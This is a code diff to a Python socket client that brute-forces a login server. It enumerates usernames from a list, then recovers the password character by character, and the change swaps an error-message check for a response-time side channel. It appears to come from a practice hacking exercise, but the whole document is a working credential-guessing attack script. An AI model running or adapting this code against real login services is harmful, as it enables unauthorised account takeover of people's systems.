@@ -1,6 +1,7 @@
 import json
 import socket
 import sys
+import time
 
 
 def file_line_iterator(filename):
@@ -21,24 +22,33 @@ try:
         found = False
 
         try:
-            username = None
+            username = ''
+            response_time = 0
             for login in login_list:
                 credentials = json.dumps({"login": login, "password": "asoiaf"})
+                start = time.time()
                 sock.send(credentials.encode())
                 response = json.loads(sock.recv(1024).decode())
+                end = time.time()
+                response_time = end - start
                 if response["result"] == "Wrong password!":
                     username = login
                     break
+
             password = ''
             while True:
                 found = False
                 for ascii_code in range(128):
                     passw = password + chr(ascii_code)
                     credentials = json.dumps({"login": username, "password": passw})
+                    start = time.time()
                     sock.send(credentials.encode())
                     response = json.loads(sock.recv(1024).decode())
-                    if response["result"] == "Exception happened during login":
+                    end = time.time()
+                    response_time_guess = end - start
+                    if response_time_guess > response_time:
                         password += chr(ascii_code)
+                        response_time = response_time_guess
                         break
                     elif response["result"] == "Connection success!":
                         password += chr(ascii_code)
@@ -46,14 +56,15 @@ try:
                         break
                 if found:
                     break
-            credentials = {"login": username, "password": password}
-            print(json.dumps(credentials))
+
+            if found:
+                credentials = {"login": username, "password": password}
+                print(json.dumps(credentials))
+            else:
+                print('Too many attempts or incorrect host/port.')
 
         except StopIteration:
             pass
-
-        if not found:
-            print("Too many attempts or incorrect host/port.")
 
 except Exception as e:
     print(f"An error occurred: {e}")
